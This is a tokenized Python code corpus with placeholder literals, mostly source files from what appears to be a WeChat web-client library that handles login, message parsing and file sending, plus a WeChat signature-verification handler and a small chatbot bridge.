<EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , } <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> self . loginInfo [ '<STR_LIT>' ] += <NUM_LIT> <EOL> try : <EOL> r = self . s . get ( url , params = params , headers = headers , <EOL> timeout = config . TIMEOUT ) <EOL> except requests . exceptions . ConnectionError as e : <EOL> try : <EOL> if not isinstance ( e . args [ <NUM_LIT> ] . args [ <NUM_LIT> ] , BadStatusLine ) : <EOL> raise <EOL> return '<STR_LIT>' <EOL> except : <EOL> raise <EOL> r . raise_for_status ( ) <EOL> regx = r'<STR_LIT>' <EOL> pm = re . search ( regx , r . text ) <EOL> if pm is None or pm . group ( <NUM_LIT> ) != '<STR_LIT>' : <EOL> logger . error ( '<STR_LIT>' % r . text ) <EOL> return None <EOL> return pm . group ( <NUM_LIT> ) <EOL> def get_msg ( self ) : <EOL> self . loginInfo [ '<STR_LIT>' ] = '<STR_LIT>' + repr ( random . random ( ) ) [ <NUM_LIT> : <NUM_LIT> ] <EOL> url = '<STR_LIT>' % ( <EOL> self . loginInfo [ '<STR_LIT>' ] , self . loginInfo [ '<STR_LIT>' ] , <EOL> self . loginInfo [ '<STR_LIT>' ] , self . loginInfo [ '<STR_LIT>' ] ) <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : ~ int ( time . time ( ) ) , } <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : config . USER_AGENT } <EOL> r = self . s . post ( url , data = json . dumps ( data ) , <EOL> headers = headers , timeout = config . TIMEOUT ) <EOL> dic = json . loads ( r . content . decode ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> if dic [ '<STR_LIT>' ] [ '<STR_LIT>' ] != <NUM_LIT> : <EOL> return None , None <EOL> self . loginInfo [ '<STR_LIT>' ] = dic [ '<STR_LIT>' ] <EOL> self . loginInfo [ '<STR_LIT>' ] = '<STR_LIT>' . join ( [ '<STR_LIT>' % ( item [ '<STR_LIT>' ] , item [ '<STR_LIT>' ] ) <EOL> for item in dic [ '<STR_LIT>' ] [ '<STR_LIT>' ] ] ) <EOL> return dic [ '<STR_LIT>' ] , dic [ '<STR_LIT>' ] <EOL> def logout ( self ) : <EOL> if self . alive : <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> params = { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , } <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> self . s . get ( url , params = params , headers = headers ) <EOL> self . alive = False <EOL> self . isLogging = False <EOL> self . s . cookies . clear ( ) <EOL> del self . chatroomList [ : ] <EOL> del self . memberList [ : ] <EOL> del self . mpList [ : ] <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , } } ) <EOL> </s>
<s> from . core import Core <EOL> from . config import VERSION , ASYNC_COMPONENTS <EOL> from . log import set_logging <EOL> if ASYNC_COMPONENTS : <EOL> from . async_components import load_components <EOL> else : <EOL> from . components import load_components <EOL> __version__ = VERSION <EOL> instanceList = [ ] <EOL> def load_async_itchat ( ) -> Core : <EOL> from . async_components import load_components <EOL> load_components ( Core ) <EOL> return Core ( ) <EOL> def load_sync_itchat ( ) -> Core : <EOL> from . components import load_components <EOL> load_components ( Core ) <EOL> return Core ( ) <EOL> if ASYNC_COMPONENTS : <EOL> instance = load_async_itchat ( ) <EOL> else : <EOL> instance = load_sync_itchat ( ) <EOL> instanceList = [ instance ] <EOL> login = instance . login <EOL> get_QRuuid = instance . get_QRuuid <EOL> get_QR = instance . get_QR <EOL> check_login = instance . check_login <EOL> web_init = instance . web_init <EOL> show_mobile_login = instance . show_mobile_login <EOL> start_receiving = instance . start_receiving <EOL> get_msg = instance . get_msg <EOL> logout = instance . logout <EOL> update_chatroom = instance . update_chatroom <EOL> update_friend = instance . update_friend <EOL> get_contact = instance . get_contact <EOL> get_friends = instance . get_friends <EOL> get_chatrooms = instance . get_chatrooms <EOL> get_mps = instance . get_mps <EOL> set_alias = instance . set_alias <EOL> set_pinned = instance . set_pinned <EOL> accept_friend = instance . accept_friend <EOL> get_head_img = instance . get_head_img <EOL> create_chatroom = instance . create_chatroom <EOL> set_chatroom_name = instance . set_chatroom_name <EOL> delete_member_from_chatroom = instance . delete_member_from_chatroom <EOL> add_member_into_chatroom = instance . add_member_into_chatroom <EOL> send_raw_msg = instance . send_raw_msg <EOL> send_msg = instance . send_msg <EOL> upload_file = instance . upload_file <EOL> send_file = instance . send_file <EOL> send_image = instance . send_image <EOL> send_video = instance . send_video <EOL> send = instance . send <EOL> revoke = instance . revoke <EOL> dump_login_status = instance . dump_login_status <EOL> load_login_status = instance . load_login_status <EOL> auto_login = instance . auto_login <EOL> configured_reply = instance . configured_reply <EOL> msg_register = instance . msg_register <EOL> run = instance . run <EOL> search_friends = instance . search_friends <EOL> search_chatrooms = instance . search_chatrooms <EOL> search_mps = instance . search_mps <EOL> set_logging = set_logging <EOL> </s>
<s> import hashlib <EOL> import web <EOL> class Handle ( object ) : <EOL> def GET ( self ) : <EOL> try : <EOL> data = web . input ( ) <EOL> if len ( data ) == <NUM_LIT> : <EOL> return "<STR_LIT>" <EOL> signature = data . signature <EOL> timestamp = data . timestamp <EOL> nonce = data . nonce <EOL> echostr = data . echostr <EOL> token = "<STR_LIT>" <EOL> list = [ token , timestamp , nonce ] <EOL> list . sort ( ) <EOL> sha1 = hashlib . sha1 ( ) <EOL> sha1 . update ( list [ <NUM_LIT> ] . encode ( "<STR_LIT>" ) ) <EOL> sha1 . update ( list [ <NUM_LIT> ] . encode ( "<STR_LIT>" ) ) <EOL> sha1 . update ( list [ <NUM_LIT> ] . encode ( "<STR_LIT>" ) ) <EOL> hashcode = sha1 . hexdigest ( ) <EOL> print ( "<STR_LIT>" , hashcode , signature ) <EOL> if hashcode == signature : <EOL> return echostr <EOL> else : <EOL> return "<STR_LIT>" <EOL> except Exception as Argument : <EOL> return Argument <EOL> </s>
<s> from bot import bot_factory <EOL> class Bridge ( object ) : <EOL> def __init__ ( self ) : <EOL> pass <EOL> def fetch_reply_content ( self , query , context ) : <EOL> return bot_factory . create_bot ( "<STR_LIT>" ) . reply ( query , context ) <EOL> </s>
<s> import requests <EOL> proxies = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> } <EOL> response = requests . get ( '<STR_LIT>' , proxies = proxies ) <EOL> print ( response . text ) <EOL> </s>
<s> import os , time , re , io <EOL> import json <EOL> import mimetypes , hashlib <EOL> import logging <EOL> from collections import OrderedDict <EOL> import requests <EOL> from . . import config , utils <EOL> from . . returnvalues import ReturnValue <EOL> from . . storage import templates <EOL> from . contact import update_local_uin <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> def load_messages ( core ) : <EOL> core . send_raw_msg = send_raw_msg <EOL> core . send_msg = send_msg <EOL> core . upload_file = upload_file <EOL> core . send_file = send_file <EOL> core . send_image = send_image <EOL> core . send_video = send_video <EOL> core . send = send <EOL> core . revoke = revoke <EOL> def get_download_fn ( core , url , msgId ) : <EOL> def download_fn ( downloadDir = None ) : <EOL> params = { <EOL> '<STR_LIT>' : msgId , <EOL> '<STR_LIT>' : core . loginInfo [ '<STR_LIT>' ] , } <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> r = core . s . get ( url , params = params , stream = True , headers = headers ) <EOL> tempStorage = io . BytesIO ( ) <EOL> for block in r . iter_content ( <NUM_LIT> ) : <EOL> tempStorage . write ( block ) <EOL> if downloadDir is None : <EOL> return tempStorage . getvalue ( ) <EOL> with open ( downloadDir , '<STR_LIT>' ) as f : <EOL> f . write ( tempStorage . getvalue ( ) ) <EOL> tempStorage . seek ( <NUM_LIT> ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , } , <EOL> '<STR_LIT>' : utils . get_image_postfix ( tempStorage . read ( <NUM_LIT> ) ) , } ) <EOL> return download_fn <EOL> def produce_msg ( core , msgList ) : <EOL> rl = [ ] <EOL> srl = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> for m in msgList : <EOL> if m [ '<STR_LIT>' ] == core . storageClass . userName : <EOL> actualOpposite = m [ '<STR_LIT>' ] <EOL> else : <EOL> actualOpposite = m [ '<STR_LIT>' ] <EOL> if '<STR_LIT>' in m [ '<STR_LIT>' ] or '<STR_LIT>' in m [ '<STR_LIT>' ] : <EOL> produce_group_chat ( core , m ) <EOL> else : <EOL> utils . msg_formatter ( m , '<STR_LIT>' ) <EOL> if '<STR_LIT>' in actualOpposite : <EOL> m [ '<STR_LIT>' ] = core . search_chatrooms ( userName = actualOpposite ) or templates . Chatroom ( { '<STR_LIT>' : actualOpposite } ) <EOL> elif actualOpposite in ( '<STR_LIT>' , '<STR_LIT>' ) : <EOL> m [ '<STR_LIT>' ] = templates . User ( { '<STR_LIT>' : actualOpposite } ) <EOL> else : <EOL> m [ '<STR_LIT>' ] = core . search_mps ( userName = actualOpposite ) or core . search_friends ( userName = actualOpposite ) or templates . User ( userName = actualOpposite ) <EOL> m [ '<STR_LIT>' ] . core = core <EOL> if m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> if m [ '<STR_LIT>' ] : <EOL> regx = r'<STR_LIT>' <EOL> data = re . search ( regx , m [ '<STR_LIT>' ] ) <EOL> data = '<STR_LIT>' if data is None else data . group ( <NUM_LIT> ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : data , } <EOL> else : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> or m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> download_fn = get_download_fn ( core , <EOL> '<STR_LIT>' % core . loginInfo [ '<STR_LIT>' ] , m [ '<STR_LIT>' ] ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' % ( time . strftime ( '<STR_LIT>' , time . localtime ( ) ) , <EOL> '<STR_LIT>' if m [ '<STR_LIT>' ] == <NUM_LIT> else '<STR_LIT>' ) , <EOL> '<STR_LIT>' : download_fn , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> download_fn = get_download_fn ( core , <EOL> '<STR_LIT>' % core . loginInfo [ '<STR_LIT>' ] , m [ '<STR_LIT>' ] ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' % time . strftime ( '<STR_LIT>' , time . localtime ( ) ) , <EOL> '<STR_LIT>' : download_fn , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> m [ '<STR_LIT>' ] [ '<STR_LIT>' ] = m [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } , } <EOL> m [ '<STR_LIT>' ] . verifyDict = msg [ '<STR_LIT>' ] <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] in ( <NUM_LIT> , <NUM_LIT> ) : <EOL> msgId = m [ '<STR_LIT>' ] <EOL> def download_video ( videoDir = None ) : <EOL> url = '<STR_LIT>' % core . loginInfo [ '<STR_LIT>' ] <EOL> params = { <EOL> '<STR_LIT>' : msgId , <EOL> '<STR_LIT>' : core . loginInfo [ '<STR_LIT>' ] , } <EOL> headers = { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : config . USER_AGENT } <EOL> r = core . s . get ( url , params = params , headers = headers , stream = True ) <EOL> tempStorage = io . BytesIO ( ) <EOL> for block in r . iter_content ( <NUM_LIT> ) : <EOL> tempStorage . write ( block ) <EOL> if videoDir is None : <EOL> return tempStorage . getvalue ( ) <EOL> with open ( videoDir , '<STR_LIT>' ) as f : <EOL> f . write ( tempStorage . getvalue ( ) ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , } } ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' % time . strftime ( '<STR_LIT>' , time . localtime ( ) ) , <EOL> '<STR_LIT>' : download_video , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> if m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> rawMsg = m <EOL> cookiesList = { name : data for name , data in core . s . cookies . items ( ) } <EOL> def download_atta ( attaDir = None ) : <EOL> url = core . loginInfo [ '<STR_LIT>' ] + '<STR_LIT>' <EOL> params = { <EOL> '<STR_LIT>' : rawMsg [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : rawMsg [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : rawMsg [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : core . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : cookiesList [ '<STR_LIT>' ] , } <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> r = core . s . get ( url , params = params , stream = True , headers = headers ) <EOL> tempStorage = io . BytesIO ( ) <EOL> for block in r . iter_content ( <NUM_LIT> ) : <EOL> tempStorage . write ( block ) <EOL> if attaDir is None : <EOL> return tempStorage . getvalue ( ) <EOL> with open ( attaDir , '<STR_LIT>' ) as f : <EOL> f . write ( tempStorage . getvalue ( ) ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , } } ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : download_atta , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> download_fn = get_download_fn ( core , <EOL> '<STR_LIT>' % core . loginInfo [ '<STR_LIT>' ] , m [ '<STR_LIT>' ] ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' % ( <EOL> time . strftime ( '<STR_LIT>' , time . localtime ( ) ) ) , <EOL> '<STR_LIT>' : download_fn , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> regx = r'<STR_LIT>' <EOL> data = re . search ( regx , m [ '<STR_LIT>' ] ) <EOL> if data : <EOL> data = data . group ( <NUM_LIT> ) . split ( u'<STR_LIT>' ) [ <NUM_LIT> ] <EOL> else : <EOL> data = '<STR_LIT>' <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : data , } <EOL> else : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> msg = update_local_uin ( core , m ) <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : m [ '<STR_LIT>' ] , } <EOL> elif m [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> regx = r'<STR_LIT>' <EOL> data = re . search ( regx , m [ '<STR_LIT>' ] ) <EOL> data = '<STR_LIT>' if data is None else data . group ( <NUM_LIT> ) . replace ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : data , } <EOL> elif m [ '<STR_LIT>' ] in srl : <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , } <EOL> else : <EOL> logger . debug ( '<STR_LIT>' % ( m [ '<STR_LIT>' ] , str ( m ) ) ) <EOL> msg = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , } <EOL> m = dict ( m , ** msg ) <EOL> rl . append ( m ) <EOL> return rl <EOL> def produce_group_chat ( core , msg ) : <EOL> r = re . match ( '<STR_LIT>' , msg [ '<STR_LIT>' ] ) <EOL> if r : <EOL> actualUserName , content = r . groups ( ) <EOL> chatroomUserName = msg [ '<STR_LIT>' ] <EOL> elif msg [ '<STR_LIT>' ] == core . storageClass . userName : <EOL> actualUserName = core . storageClass . userName <EOL> content = msg [ '<STR_LIT>' ] <EOL> chatroomUserName = msg [ '<STR_LIT>' ] <EOL> else : <EOL> msg [ '<STR_LIT>' ] = core . storageClass . userName <EOL> msg [ '<STR_LIT>' ] = core . storageClass . nickName <EOL> msg [ '<STR_LIT>' ] = False <EOL> utils . msg_formatter ( msg , '<STR_LIT>' ) <EOL> return <EOL> chatroom = core . storageClass . search_chatrooms ( userName = chatroomUserName ) <EOL> member = utils . search_dict_list ( ( chatroom or { } ) . get ( <EOL> '<STR_LIT>' ) or [ ] , '<STR_LIT>' , actualUserName ) <EOL> if member is None : <EOL> chatroom = core . update_chatroom ( chatroomUserName ) <EOL> member = utils . search_dict_list ( ( chatroom or { } ) . get ( <EOL> '<STR_LIT>' ) or [ ] , '<STR_LIT>' , actualUserName ) <EOL> if member is None : <EOL> logger . debug ( '<STR_LIT>' % actualUserName ) <EOL> msg [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> msg [ '<STR_LIT>' ] = False <EOL> else : <EOL> msg [ '<STR_LIT>' ] = member . get ( '<STR_LIT>' , '<STR_LIT>' ) or member [ '<STR_LIT>' ] <EOL> atFlag = '<STR_LIT>' + ( chatroom [ '<STR_LIT>' ] . get ( '<STR_LIT>' , '<STR_LIT>' ) or core . storageClass . nickName ) <EOL> msg [ '<STR_LIT>' ] = ( <EOL> ( atFlag + ( u'<STR_LIT>' if u'<STR_LIT>' in msg [ '<STR_LIT>' ] else '<STR_LIT>' ) ) <EOL> in msg [ '<STR_LIT>' ] or msg [ '<STR_LIT>' ] . endswith ( atFlag ) ) <EOL> msg [ '<STR_LIT>' ] = actualUserName <EOL> msg [ '<STR_LIT>' ] = content <EOL> utils . msg_formatter ( msg , '<STR_LIT>' ) <EOL> def send_raw_msg ( self , msgType , content , toUserName ) : <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : msgType , <EOL> '<STR_LIT>' : content , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : ( toUserName if toUserName else self . storageClass . userName ) , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> } , <EOL> '<STR_LIT>' : <NUM_LIT> , } <EOL> headers = { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : config . USER_AGENT } <EOL> r = self . s . post ( url , headers = headers , <EOL> data = json . dumps ( data , ensure_ascii = False ) . encode ( '<STR_LIT>' ) ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> def send_msg ( self , msg = '<STR_LIT>' , toUserName = None ) : <EOL> logger . debug ( '<STR_LIT>' % ( toUserName , msg ) ) <EOL> r = self . send_raw_msg ( <NUM_LIT> , msg , toUserName ) <EOL> return r <EOL> def _prepare_file ( fileDir , file_ = None ) : <EOL> fileDict = { } <EOL> if file_ : <EOL> if hasattr ( file_ , '<STR_LIT>' ) : <EOL> file_ = file_ . read ( ) <EOL> else : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> else : <EOL> if not utils . check_file ( fileDir ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> with open ( fileDir , '<STR_LIT>' ) as f : <EOL> file_ = f . read ( ) <EOL> fileDict [ '<STR_LIT>' ] = len ( file_ ) <EOL> fileDict [ '<STR_LIT>' ] = hashlib . md5 ( file_ ) . hexdigest ( ) <EOL> fileDict [ '<STR_LIT>' ] = io . BytesIO ( file_ ) <EOL> return fileDict <EOL> def upload_file ( self , fileDir , isPicture = False , isVideo = False , <EOL> toUserName = '<STR_LIT>' , file_ = None , preparedFile = None ) : <EOL> logger . debug ( '<STR_LIT>' % ( <EOL> '<STR_LIT>' if isPicture else '<STR_LIT>' if isVideo else '<STR_LIT>' , fileDir ) ) <EOL> if not preparedFile : <EOL> preparedFile = _prepare_file ( fileDir , file_ ) <EOL> if not preparedFile : <EOL> return preparedFile <EOL> fileSize , fileMd5 , file_ = preparedFile [ '<STR_LIT>' ] , preparedFile [ '<STR_LIT>' ] , preparedFile [ '<STR_LIT>' ] <EOL> fileSymbol = '<STR_LIT>' if isPicture else '<STR_LIT>' if isVideo else '<STR_LIT>' <EOL> chunks = int ( ( fileSize - <NUM_LIT> ) / <NUM_LIT> ) + <NUM_LIT> <EOL> clientMediaId = int ( time . time ( ) * <NUM_LIT> ) <EOL> uploadMediaRequest = json . dumps ( OrderedDict ( [ <EOL> ( '<STR_LIT>' , <NUM_LIT> ) , <EOL> ( '<STR_LIT>' , self . loginInfo [ '<STR_LIT>' ] ) , <EOL> ( '<STR_LIT>' , clientMediaId ) , <EOL> ( '<STR_LIT>' , fileSize ) , <EOL> ( '<STR_LIT>' , <NUM_LIT> ) , <EOL> ( '<STR_LIT>' , fileSize ) , <EOL> ( '<STR_LIT>' , <NUM_LIT> ) , <EOL> ( '<STR_LIT>' , self . storageClass . userName ) , <EOL> ( '<STR_LIT>' , toUserName ) , <EOL> ( '<STR_LIT>' , fileMd5 ) ] <EOL> ) , separators = ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> r = { '<STR_LIT>' : { '<STR_LIT>' : - <NUM_LIT> , '<STR_LIT>' : '<STR_LIT>' } } <EOL> for chunk in range ( chunks ) : <EOL> r = upload_chunk_file ( self , fileDir , fileSymbol , fileSize , <EOL> file_ , chunk , chunks , uploadMediaRequest ) <EOL> file_ . close ( ) <EOL> if isinstance ( r , dict ) : <EOL> return ReturnValue ( r ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> def upload_chunk_file ( core , fileDir , fileSymbol , fileSize , <EOL> file_ , chunk , chunks , uploadMediaRequest ) : <EOL> url = core . loginInfo . get ( '<STR_LIT>' , core . loginInfo [ '<STR_LIT>' ] ) + '<STR_LIT>' <EOL> cookiesList = { name : data for name , data in core . s . cookies . items ( ) } <EOL> fileType = mimetypes . guess_type ( fileDir ) [ <NUM_LIT> ] or '<STR_LIT>' <EOL> fileName = utils . quote ( os . path . basename ( fileDir ) ) <EOL> files = OrderedDict ( [ <EOL> ( '<STR_LIT>' , ( None , '<STR_LIT>' ) ) , <EOL> ( '<STR_LIT>' , ( None , fileName ) ) , <EOL> ( '<STR_LIT>' , ( None , fileType ) ) , <EOL> ( '<STR_LIT>' , ( None , time . strftime ( '<STR_LIT>' ) ) ) , <EOL> ( '<STR_LIT>' , ( None , str ( fileSize ) ) ) , <EOL> ( '<STR_LIT>' , ( None , None ) ) , <EOL> ( '<STR_LIT>' , ( None , None ) ) , <EOL> ( '<STR_LIT>' , ( None , fileSymbol ) ) , <EOL> ( '<STR_LIT>' , ( None , uploadMediaRequest ) ) , <EOL> ( '<STR_LIT>' , ( None , cookiesList [ '<STR_LIT>' ] ) ) , <EOL> ( '<STR_LIT>' , ( None , core . loginInfo [ '<STR_LIT>' ] ) ) , <EOL> ( '<STR_LIT>' , ( fileName , file_ . read ( <NUM_LIT> ) , '<STR_LIT>' ) ) ] ) <EOL> if chunks == <NUM_LIT> : <EOL> del files [ '<STR_LIT>' ] ; del files [ '<STR_LIT>' ] <EOL> else : <EOL> files [ '<STR_LIT>' ] , files [ '<STR_LIT>' ] = ( None , str ( chunk ) ) , ( None , str ( chunks ) ) <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> return core . s . post ( url , files = files , headers = headers , timeout = config . TIMEOUT ) <EOL> def send_file ( self , fileDir , toUserName = None , mediaId = None , file_ = None ) : <EOL> logger . debug ( '<STR_LIT>' % ( <EOL> mediaId , toUserName , fileDir ) ) <EOL> if hasattr ( fileDir , '<STR_LIT>' ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> if toUserName is None : <EOL> toUserName = self . storageClass . userName <EOL> preparedFile = _prepare_file ( fileDir , file_ ) <EOL> if not preparedFile : <EOL> return preparedFile <EOL> fileSize = preparedFile [ '<STR_LIT>' ] <EOL> if mediaId is None : <EOL> r = self . upload_file ( fileDir , preparedFile = preparedFile ) <EOL> if r : <EOL> mediaId = r [ '<STR_LIT>' ] <EOL> else : <EOL> return r <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : ( "<STR_LIT>" % os . path . basename ( fileDir ) + <EOL> "<STR_LIT>" + <EOL> "<STR_LIT>" % ( str ( fileSize ) , mediaId ) + <EOL> "<STR_LIT>" % os . path . splitext ( fileDir ) [ <NUM_LIT> ] . replace ( '<STR_LIT>' , '<STR_LIT>' ) ) , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : toUserName , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , } , <EOL> '<STR_LIT>' : <NUM_LIT> , } <EOL> headers = { <EOL> '<STR_LIT>' : config . USER_AGENT , <EOL> '<STR_LIT>' : '<STR_LIT>' , } <EOL> r = self . s . post ( url , headers = headers , <EOL> data = json . dumps ( data , ensure_ascii = False ) . encode ( '<STR_LIT>' ) ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> def send_image ( self , fileDir = None , toUserName = None , mediaId = None , file_ = None ) : <EOL> logger . debug ( '<STR_LIT>' % ( <EOL> mediaId , toUserName , fileDir ) ) <EOL> if fileDir or file_ : <EOL> if hasattr ( fileDir , '<STR_LIT>' ) : <EOL> file_ , fileDir = fileDir , None <EOL> if fileDir is None : <EOL> fileDir = '<STR_LIT>' <EOL> else : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> if toUserName is None : <EOL> toUserName = self . storageClass . userName <EOL> if mediaId is None : <EOL> r = self . upload_file ( fileDir , isPicture = not fileDir [ - <NUM_LIT> : ] == '<STR_LIT>' , file_ = file_ ) <EOL> if r : <EOL> mediaId = r [ '<STR_LIT>' ] <EOL> else : <EOL> return r <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : mediaId , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : toUserName , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , } , <EOL> '<STR_LIT>' : <NUM_LIT> , } <EOL> if fileDir [ - <NUM_LIT> : ] == '<STR_LIT>' : <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> data [ '<STR_LIT>' ] [ '<STR_LIT>' ] = <NUM_LIT> <EOL> data [ '<STR_LIT>' ] [ '<STR_LIT>' ] = <NUM_LIT> 